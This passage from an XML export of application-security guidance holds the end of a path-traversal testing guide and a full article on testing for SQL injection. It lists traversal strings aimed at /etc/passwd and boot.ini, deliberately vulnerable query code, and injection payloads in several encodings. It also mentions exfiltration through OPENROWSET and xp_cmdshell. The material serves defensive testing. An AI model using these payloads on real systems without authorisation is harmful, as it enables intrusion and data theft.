&lt;em&gt;page&lt;/em&gt;). &lt;/li&gt;&lt;li&gt;Replace the value of the variable found in Step 2 with an attack string (see Table 1 below). For instance:
&lt;em&gt;http://example.com.pe/example.jsp?page&lt;strong&gt;=&lt;/strong&gt;../../../etc/passwd&lt;/em&gt;.
&lt;/li&gt;&lt;li&gt;Submit the request to the application and wait for a response.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: The application must give an error message indicating that the file path has been manipulated. The application is vulnerable if it uses the path supplied in Step 3 to determine the response, and the attacker-specified file is used in the
 response.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for path manipulation in Web form variables&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps to test for path manipulation through Web forms:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Navigate to a page containing a Web form that prompts for a file name. &lt;/li&gt;&lt;li&gt;Locate the variable (input field) used by the application to determine the file name.
&lt;/li&gt;&lt;li&gt;Enter the attack string in the field that indicates the filename (see Table 1 below).&lt;br&gt;
Here, it is important to disable any client-side checks that may deny entering an attack string due to illegal characters. For more information, see
&lt;a href="?#ruledisplay:fc95c5e5-667a-4e66-b1cf-f7d0529c4c2f"&gt;How to Test for Client-Side Validation Bypass Bugs in Java&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;Submit the request to the application and wait for a response.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results are the same as the previous test case: The application must give an error message indicating that the file path has been manipulated. The application is vulnerable if it uses the path supplied in Step 3 to determine the response, and the
 attacker-specified file is used in the response.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Attack strings&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The following attack strings contain path manipulation characters (dots, slashes, and backslashes) and common UNIX- and Windows-related file paths in different encodings. Depending on the relative location of the Web application on the server, the number
 of “../” or “..\” clauses may need to be increased or decreased to realize an attack:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;../etc/passwd&lt;br&gt;..\boot.ini&lt;br&gt;../boot.ini&lt;br&gt;folder_name/file_name&lt;br&gt;..\..\folder_name\file_name&lt;br&gt;../../folder_name/file_name&lt;br&gt;C:\boot.ini&lt;br&gt;%2e%2e\%2e%2e\&lt;br&gt;..%2f..%2f&lt;br&gt;%2e%2e%2f%2e%2e%2ffolder_name%2ffile_name&lt;br&gt;..%2f..%2ffolder_name%2ffile_name&lt;br&gt;..%c0%af..%c0%affolder_name..%c0%affile_name &lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;strong&gt;Table 1 - Path Manipulation Attack Strings&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Look for error messages that indicate file operations&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;While executing the basic test cases mentioned above, it is important to look for different types of error messages. For instance, “invalid input” or “incorrect format” error messages indicate that an application is safe, while “file not found” or HTTP 404
 errors indicate that the application may be using the attack string to find a file in a different path, and may be vulnerable to this bug.&lt;/p&gt;
&lt;h1&gt;Step 4: Execute Additional Testing&lt;/h1&gt;
&lt;p&gt;Finally, it is important to execute additional testing for double encoding scenarios as well as to cover all of the application’s input points.&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;&lt;em&gt;Cover double encoding scenarios&lt;/em&gt;&lt;/h1&gt;
&lt;p&gt;Since this attack requires passing malicious input to a Web application, it is necessary for proper coverage to add double encoding test cases. Double encoding consists of re-encoding the percent sign (%) in percent-encoded values with its percent-encoded
 equivalent (%25). For instance, translating the first URL into the second one:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;../../&amp;nbsp; (no encoding)&lt;/pre&gt;
&lt;pre&gt;..%2f..%2f&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (single encoding)&lt;/pre&gt;
&lt;pre&gt;..%252f..%252f (double encoding)&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Make sure to add a double-encoded test case for every attack string that you use. For more information about double encoding attacks, see
&lt;a href="?#ruledisplay:5c99da7b-b4eb-4315-b48c-ac2598c13144"&gt;How to Test for Double Encoding Bugs in Java&lt;/a&gt;&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test through all input points&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Even though path manipulation attacks commonly happen through the URL or Web forms, it is important to look at additional application input points. Web applications can also take input from client cookies, Web methods, extended frameworks (such as Flash/Flex),
 and third-party APIs (such as Facebook) parameters. Make sure to test for path manipulation in every place where input is taken.&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Path manipulation bugs allow attackers to access a server-side file to execute attacks such as information disclosure and denial of service. They&amp;nbsp;can be&amp;nbsp;successful when applications don’t properly validate user input against a whitelist and allow path manipulating
 characters such as dots and slashes to be processed by the application. To test for this vulnerability, you must identify the file path determining variable, commonly sent in the URL or in a Web form, and replace it with an attack string while looking for
 an error message that indicates that the attack string is being used. Finally, to achieve proper test coverage of this bug, be sure to cover double encoding scenarios and test through all of the application’s input points.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>73fc5ea6-1115-4210-92bd-1941e4f46e25</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test For SQL Injection Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;All applications that interact with a database such as: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web applications written ASP, ASP .NET, PHP, Visual Basic, C#, Java, or Perl using a database
&lt;/li&gt;&lt;li&gt;Non web-applications that interact with database back-end&lt;/li&gt;&lt;/ul&gt;
&lt;br&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;SQL Injection is a common type of web database related vulnerability.&amp;nbsp;&amp;nbsp; SQL injection is common to web site applications that interact with a database backend.&amp;nbsp; These sites construct SQL commands or queries based on user input.&amp;nbsp; For example they might search
 a product database based on a description a user typed in a web form.&amp;nbsp; An application is vulnerable to SQL injection when it builds SQL queries without filtering the user's input, without using store procedure, or without binding parameters variables.&amp;nbsp; This
 can lead to an attacker adding additional clauses, conditions, or even commands that execute along the original query.&amp;nbsp;&amp;nbsp;&amp;nbsp; Attackers can use SQL Injection bugs to execute different types of attacks such as data theft and tampering, authentication bypass, information
 disclosure, and elevation of privileges.&lt;/p&gt;
&lt;p&gt;Below is a summary of steps needed for testing for SQL injection bugs&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;:&amp;nbsp; Understand SQL injection attack scenarios &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 2&lt;/strong&gt;:&amp;nbsp; List high risk components and entry points &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 3&lt;/strong&gt;:&amp;nbsp; Start testing and exploring &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 4&lt;/strong&gt;:&amp;nbsp; Tune of test data&lt;/li&gt;&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It is important to understand attack scenarios so that you know what to look for when testing for SQL injection.&amp;nbsp; Here are two common attack scenarios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Search Engine scenario &lt;/li&gt;&lt;li&gt;Form Authentication scenario&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Search engine scenario&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Most web sites have search pages that take a search query from the user, create a SQL query with it, execute the query at a SQL backend database, and return the results to the user.&amp;nbsp; These components will end up creating a SQL similar to this:&lt;/p&gt;
&lt;pre&gt;SELECT * item, description FROM products WHERE description LIKE usersearch (from input)&lt;/pre&gt;
&lt;p&gt;For instance, a web server takes search data from the user either from a form or from a URL that looks like this:&lt;/p&gt;
&lt;pre&gt;http://www.teammentorexample.com/products/search.php?prod=bike (PHP)&lt;/pre&gt;
&lt;pre&gt;http://www.teammentorexample.com/products/search.asp?prod=bike (ASP)&lt;/pre&gt;
&lt;p&gt;The server might use code like this in the search component: &lt;/p&gt;
&lt;pre&gt;$query = &amp;quot;select item, description from productTable where description LIKE '%&amp;quot; . $_GET[&amp;quot;prod&amp;quot;] . &amp;quot;%'&amp;quot;&amp;nbsp;&amp;nbsp; (PHP)&lt;/pre&gt;
&lt;pre&gt;var query = &amp;quot;select item, description from productTable where description LIKE '%&amp;quot; &amp;#43; Request.QueryString(&amp;quot;prod&amp;quot;) &amp;#43; &amp;quot;%'&amp;quot;&amp;nbsp; (ASP)&lt;/pre&gt;
&lt;p&gt;In both of the cases above the attacker can modify the URL and inject SQL statements that will be concatenated to the query and executed as part of the SQL query.&amp;nbsp; If the attacker changes the value passed in prod by:&lt;/p&gt;
&lt;pre&gt;any OR 1=1&lt;/pre&gt;
&lt;p&gt;Then the query will return all of the rows in the table since the second condition 1=1 will be always true:&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;SELECT * item, description FROM products WHERE description LIKE 'any' OR 1=1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Forms authentication scenario&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Another example of a high risk component is the code used in forms authentication. For example, the code below, accepts credentials to build a SELECT query to validate the user.&amp;nbsp; The data is passed to the login.php page through a web form's POST using username
 and password variables.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;A SQL injection bug is present in this code:&lt;/p&gt;
&lt;pre&gt;$query = &amp;quot;SELECT * FROM Accounts WHERE UserName = '&amp;quot; . $_POST['name'] . &amp;quot;'&amp;quot; . &amp;quot; AND password = '&amp;quot; . $_POST['pass'] . &amp;quot;'&amp;quot;; &lt;/pre&gt;
&lt;pre&gt;$result = odbc_exec($connection, $query);&lt;/pre&gt;
&lt;pre&gt;if ($result_count == 0) {&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; print('unable to login');&lt;/pre&gt;
&lt;pre&gt;}&lt;/pre&gt;
&lt;pre&gt;else {&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; print('user logged in');&lt;/pre&gt;
&lt;pre&gt;}&lt;/pre&gt;
&lt;p&gt;An attacker can submit the same string as in the first scenario:&lt;/p&gt;
&lt;pre&gt;any OR 1=1&lt;/pre&gt;
&lt;p&gt;This will result in the following statement constructed:&lt;/p&gt;
&lt;pre&gt;SELECT * FROM Accounts WHERE UserName = any or 1=1&lt;/pre&gt;
&lt;p&gt;The statement returns all rows from the Accounts table.&amp;nbsp; The if condition in the code will be false and the attacker will be able to log in without a valid password.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Stored procedure scenario&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SQL injection bugs aren';t necessarily restricted to the application layer.&amp;nbsp; For instance, a stored procedure used at the database layer may also suffer from SQL injection.&amp;nbsp; Consider the following procedure that takes a parameter for a product name and searches
 a database by building a dynamic SELECT statement inside:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;CREATE PROCEDURE sp_SearchProducts @prodname varchar(400) = NULL AS&lt;/pre&gt;
&lt;pre&gt;DECLARE @sql nvarchar(4000)&lt;/pre&gt;
&lt;pre&gt;SELECT @sql = ' SELECT ProductID, ProductName, Category, Price ' &amp;#43;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ' FROM Product Where ProductName LIKE ''' &amp;#43; @prodname &amp;#43; ''''&lt;/pre&gt;
&lt;pre&gt;EXEC (@sql)&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;The can invoke the procedure at the application layer like this:&lt;/p&gt;
&lt;pre&gt;exec sp_SearchProducts('any'' OR 1=1--')&lt;/pre&gt;
&lt;p&gt;The final statement will look like this:&lt;/p&gt;
&lt;pre&gt;SELECT ProductID, ProductName, Category, Price FROM Product Where ProductName LIKE 'any' OR 1=1—'&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;This will return all rows of the product table.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;Be careful with this type of scenario since it is a common misbelieve that using stored procedures and bound parameters solve SQL injection automatically.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2: List High Risk Components and Entry Points&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The next step for SQL Injection testing is to list all the places where code builds SQL statements from user supplied input; to understand how and where our application manipulates statement and talks to a database.&amp;nbsp; The most common are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Search web pages &lt;/li&gt;&lt;li&gt;Profile-related web pages &lt;/li&gt;&lt;li&gt;Authentication forms &lt;/li&gt;&lt;li&gt;E-Commerce or financial account-related pages &lt;/li&gt;&lt;li&gt;Database interaction public API's and DCOM methods &lt;/li&gt;&lt;li&gt;Database system-level clients&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Identify all high risk components &lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After understanding the details of SQL Injection, list their high risk components in a table that includes the method that hosts the code, the name of the query string if available, and the variable names that influence the construction of the query&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Look at code like the one shown in the scenarios above; code where SQL statements are built using web input.&amp;nbsp; Then list all of these web pages as high risk components.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Match High Risk Components with Entry Points&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After listing all areas in the application where SQL statements are built at run-time, you&amp;nbsp; must identify the ways in which data gets to these places.&amp;nbsp; For example, you listed a web page named &amp;quot;search.asp&amp;quot; above that constructs SQL statements dangerously.&amp;nbsp;
 Here you list how this page gets its input; what are its entry points.&amp;nbsp; Keep in mind that entry points can be both intended (expected by the program or application) and unintended (unexpected by program or application).&amp;nbsp; A common list of entry points for SQL
 injection high risk components include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL bar contents &lt;/li&gt;&lt;li&gt;Web form input values &lt;/li&gt;&lt;li&gt;Web service methods &lt;/li&gt;&lt;li&gt;Network packets &lt;/li&gt;&lt;li&gt;Public API's &lt;/li&gt;&lt;li&gt;DCOM methods &lt;/li&gt;&lt;li&gt;Application UI text fields &lt;/li&gt;&lt;li&gt;Inter Process Communication pipe&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The first three are the most common entry points for web services and application.&amp;nbsp; Nonetheless, always look for new entry points additional entry points not listed here.&amp;nbsp; Make sure that the data manipulated by the component at risk is not passed by any
 other means.&lt;/p&gt;
&lt;p&gt;Ideally by the end of step 2 you will have a table like the one shown above to systematically guide test execution.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 3: Start Testing and Exploring &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following step is to start supplying input to the application that gives hints of possible SQL injection bugs.&amp;nbsp; With the list made during step 2, you can systematically walk through all variables and start exploring how the test input is handled.&amp;nbsp; In
 this step, we recommend to execute a first pass using fuzz strings and basic conditions.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Start with a simple fuzz string&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The first recommended test is to add some string and a single quote or parenthesis at the end of it.&amp;nbsp; In most SQL Injection cases this kind of string will generate a server side error that will be displayed back in the client's browser:&lt;/p&gt;
&lt;pre&gt;xyz') &amp;quot;]&lt;/pre&gt;
&lt;p&gt;Then see how the server reacts to it.&amp;nbsp; In some cases it will strip out the special characters: this is a sign that it protects against injection.&amp;nbsp; However, in other cases the application may return a SQL related error messages because a special character
 such as the single quote unexpectedly closed a statement.&amp;nbsp; It then can be deduced that the statement was being built dynamically.&amp;nbsp; This is a clear indication that you need to keep looking to see whether a SQL injection bug actually exists.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Continue with simple true and false conditions&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The next step is to try to add a simple SQL statement.&amp;nbsp; The simplest you can try is an integer comparison such as 1=1 or 2&amp;gt;1 or a character comparison such as 'a'='a' proceeded by an OR.&amp;nbsp; For instance:&lt;/p&gt;
&lt;pre&gt;xyz' OR 1=1 --&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;Then observe the results.&amp;nbsp; Look for any indication that the o injected true statement returned all rows of a table.&amp;nbsp; Then try a false statement and look at the difference.&lt;/p&gt;
&lt;pre&gt;xyz' OR 1&amp;gt;2 --&lt;/pre&gt;
&lt;p&gt;If the results are visibly different in quantity or in server behavior, then the possibility for a SQL injection bugs is high.&amp;nbsp; Even if no information about the database structure or no other serious attack is possible, you can determine SQL injection by
 observing basic server and error messages.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;Consider the following scenario.&amp;nbsp; The string &amp;quot;xyz' OR 1=1&amp;quot; -is submitted and the server returns a 500 error that says:&lt;/p&gt;
&lt;pre&gt;&amp;nbsp;&amp;quot;Results Buffer too Large&amp;quot; and when &amp;quot;xyz' OR 1&amp;gt;2 -&amp;quot; &lt;/pre&gt;
&lt;p&gt;is submitted the server returns a valid page saying that there were no matches.&amp;nbsp; So when the condition is true the server chokes with results.&amp;nbsp; When it's false it returns no results.&amp;nbsp; In this case, the processing of the injected condition is evident and
 means that there is a SQL injection bug.&amp;nbsp; It might not be exploitable but it exists and this simple difference in server behavior is enough to prove that it does.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;NOTE: Be careful with valid numerical results&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Make sure that when using numerical comparisons the results are different because of the comparison and not because of the content.&amp;nbsp; For example, if when using 1=1 the server returns phone numbers with &amp;quot;11&amp;quot; and when 1&amp;gt;2 returns &amp;quot;21&amp;quot; numbers or matches then
 it means that is not processing the actual comparison.&amp;nbsp; The results are different because the application is querying over the numbers 1 and 2.&amp;nbsp; The server is not executing the extra conditions as separate statements; it is correctly including them as part
 of the data to search, and there is no evidence of a SQL injection vulnerability.&amp;nbsp; You need to be careful about this scenario and realize when the extra condition is actually being executed separately or not.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4: Tune test cases data &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;At this point you have started executing an exploratory pass through the input variables.&amp;nbsp; During step 4 you need to concentrate on covering all entry points of each variable in your variable table.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Learn type database version &lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Different database applications and versions process queries differently.&amp;nbsp; For example SQL Server uses &amp;#43; to concatenate strings in a statement while Oracle uses ||.&amp;nbsp;&amp;nbsp; SQL Server allows execution of batched or multiple SQL commands within a statement as long
 as they are separated with a semicolon (;) while Oracle and MySQL forbids this.&amp;nbsp; You can gather database brand and versions by scanning network ports at the server, sniffing network traffic, or looking at SQL related error messages.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Consider string format and encoding according to entry point&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As you walk through the risky variables and entry points take into account the different formats that apply to each entry point.&amp;nbsp; For example, this article described passing the following string to a web form:&lt;/p&gt;
&lt;pre&gt;xyz' OR 1=1 --&lt;/pre&gt;
&lt;p&gt;However, you can't pass a string like the one above in a URL since the URL doesn't allow blank spaces.&amp;nbsp; Server applications use different encoding functions to transmit URL contents.&amp;nbsp; They encode data and then decode it at the server end.&amp;nbsp; The encoding and
 decoding depends on the server's programming language.&amp;nbsp; For example, sometimes the encoding function replaces the blank spaces with a plus (&amp;#43;) sign so the string above looks like this:&lt;/p&gt;
&lt;pre&gt;xyz'&amp;#43;OR&amp;#43;1=1&amp;#43;--&lt;/pre&gt;
&lt;p&gt;In other encoding case, the server might replace the blank space with a %20.&amp;nbsp; In that case, the test string will need to look like this:&lt;/p&gt;
&lt;pre&gt;xyz'%20OR%201=1%20--&lt;/pre&gt;
&lt;p&gt;This common encoding scheme consists of replacing spaces with their hexadecimal values %HH.&amp;nbsp; In addition, it is recommended to also encode reserved characters such as the single quote.&amp;nbsp; The encoded string will then look like this:&lt;/p&gt;
&lt;pre&gt;xyz%27&amp;#43;OR&amp;#43;1%3D1&amp;#43;--&lt;/pre&gt;
&lt;p&gt;The Java URL encode function translates special characters using a string like this one %uXXXX where XXXX is the character´s Unicode value represented as four digits.&amp;nbsp; The above string will look like this one:&lt;/p&gt;
&lt;pre&gt;xyz%u2019&amp;#43;OR&amp;#43;1%3D1&amp;#43;--&lt;/pre&gt;
&lt;p&gt;There are different types of encoding mechanisms.&amp;nbsp; It is important that you do a quick source review to see what encoding functions are used and then at the documentation available for the specific functions. To learn more, see &amp;quot;Percent Encoding&amp;quot; at
&lt;a href="http://en.wikipedia.org/wiki/Percent-encoding"&gt;http://en.wikipedia.org/wiki/Percent-encoding&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note:&amp;nbsp; Try to use double encoding&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It is important to attempt to execute double encoding cases.&amp;nbsp;&amp;nbsp; Double encoding is a specific encoding aimed at bypassing security controls.&amp;nbsp; It consists of replacing the percent character by its hexadecimal value (25).&amp;nbsp; If you are testing using single encoding
 like this:&lt;/p&gt;
&lt;pre&gt;xyz%27&amp;#43;OR&amp;#43;1%3D1&amp;#43;--&lt;/pre&gt;
&lt;p&gt;Then try the following string for double encoding:&lt;/p&gt;
&lt;pre&gt;xyz%2527&amp;#43;OR&amp;#43;1%253D1&amp;#43;--&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Try different syntax&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SQL injection testing aims at changing the logic of the original SQL statement by adding additional ones.&amp;nbsp; But for the additional statements to execute, the attacked query has to remain syntactically correct or else it will fail to execute.&amp;nbsp; Consider different
 variants of test input to deal with the closing of quotes and parenthesis.&amp;nbsp; Here are a few variations to try:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;x' or 1=1 -- &lt;/li&gt;&lt;li&gt;x' or 'a'='a &lt;/li&gt;&lt;li&gt;x&amp;quot; or 1=1 # &lt;/li&gt;&lt;li&gt;x%' or 1=1 --&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/li&gt;&lt;li&gt;x%&amp;quot; or 1=1 # &lt;/li&gt;&lt;li&gt;x') or 1=1 # &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/li&gt;&lt;li&gt;x') or 'a'='a' -- &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/li&gt;&lt;li&gt;x') or ('a'='a&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Consider the different ways of getting test results&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are different channels to retrieve SQL injection data:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;In band&lt;/strong&gt; - When the attacked server returns the data to the attacker using an existing channel such as a rendered table in a web page, or by logging on the user to a restricted page
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Out of band&lt;/strong&gt; - When the attacker opens a new connection to get data from the server such as when installing a Trojan in the server, using an extended stored procedure such as xp_cmdshell to open a remote connection, or using MS SQL's OPENROWSET()
 to connect directly to the database. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Inferred&lt;/strong&gt; - When the attacked server doesn't send any data to the attacker and the attacker needs to execute his attack using alternate queries and observing error codes.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Cover the different methods of retrieving data from the server during this step.&amp;nbsp;&amp;nbsp;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Execute different payloads&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes executing a simple true or false condition will not generate visible results.&amp;nbsp; This is the main reasons why you need to try different payloads.&amp;nbsp; There are hundreds of possible payloads to execute in a SQL injection attack.&amp;nbsp; Most of these payloads
 vary between SQL server applications and can be found in the web.&amp;nbsp; Just to get an idea of how different payloads can be, let's picture the case of trying to steal information from a database. &amp;nbsp;The payload can vary between:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An OR with simple condition that returns all rows (like OR 1=1) &lt;/li&gt;&lt;li&gt;An UNION SELECT statement that executes and additional SELECT query and appends the results to the original result set. To learn more, see&amp;nbsp;&lt;a href="http://www.securitydocs.com/pdf/2656.PDF"&gt;SQL Injection:&amp;nbsp; Are your Web Applications Vulnerable?&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;An OPENROWSET command that opens a connection to a hacker database and sends the data to the remote attacker. To learn more, see
&lt;a href="http://www.appsecinc.com/presentations/Manipulating_SQL_Server_Using_SQL_Injection.pdf"&gt;
Manipulating Microsoft SQL Server Using SQL Injection&lt;/a&gt; &lt;/li&gt;&lt;li&gt;A call to a stored procedure such as xp_cmdshell to open a backdoor or install a Trojan that will send the information back to the attacker
&lt;/li&gt;&lt;li&gt;An inference attack that uses CASE statements to get data byte by byte. To learn more, see
&lt;a href="http://www.ngssoftware.com/papers/sqlinference.pdf"&gt;Data-mining with SQL Injection and Inference&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Tampering also has different scenarios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An additional DROP statement to drop a table from a database &lt;/li&gt;&lt;li&gt;An additional INSERT statement to add a record to a table &lt;/li&gt;&lt;li&gt;An additional UPDATE statement to replace existing data in a table&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;You need to try different payloads.&amp;nbsp;&amp;nbsp; We recommend listing all the payloads that can be executed against the database under test.&amp;nbsp;&amp;nbsp; Then to execute each payload with the syntactic variations previously mentioned.&amp;nbsp; By doing this, you will expand their SQL
 injection test cases to get maximum testing coverage. &lt;/p&gt;
&lt;p&gt;Nevertheless, keep in mind that it is also important not to overdo payload testing.&amp;nbsp; If you realize that a specific variable-entry point is not susceptible to SQL injection (it might be parameterized or escaped of its command characters) then move on to
 the next variable and not spend unnecessary time testing numerous payloads.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;NOTE:&amp;nbsp; Use proper test monitors or indicators&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When testing injection, especially out of bands that opens a separate channel to send data back, make sure to have in indicator that waits for the test to pass or fail.&amp;nbsp; If the payload opens a backdoor then connect to the backdoor.&amp;nbsp;&amp;nbsp; If the payload copies
 a database to a remote database then have that server set up and ready to receive the stolen data.&amp;nbsp;&amp;nbsp; Having proper indicators and monitors in place is the only way to find out the results of all test cases.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Learn database structure and use to tune test cases&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In almost all information disclosure and tampering scenarios, the attacker will need to know table and column names.&amp;nbsp;&amp;nbsp; One way to successfully discover database details is to use error messages smartly.&amp;nbsp;&amp;nbsp; Another way to discover database structure such as
 table names and columns is to brute force table names or column names and look for valid ones.&amp;nbsp; Finally, you can discover details about the database using inference techniques.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Good SQL Injection testing relies on proper coverage of all SQL related input variables through their different entry points.&amp;nbsp; Start by understanding attack scenarios and doing a comprehensive analysis of the application's SQL related input variables, query
 construction, and entry points.&amp;nbsp; Then try basic tests, tune the test data based on different entry points, and look carefully how the application reacts.&amp;nbsp;&amp;nbsp; Finally, tune your data using the appropriate payloads and keep tuning test case data with learned or
 inferred database structure.&lt;/p&gt;
&lt;h1&gt;Additional Resources&amp;nbsp;&lt;/h1&gt;
&lt;div&gt;&lt;br&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Percent Encoding.&amp;nbsp; Wikipedia. &lt;a href="http://en.wikipedia.org/wiki/Percent-encoding"&gt;
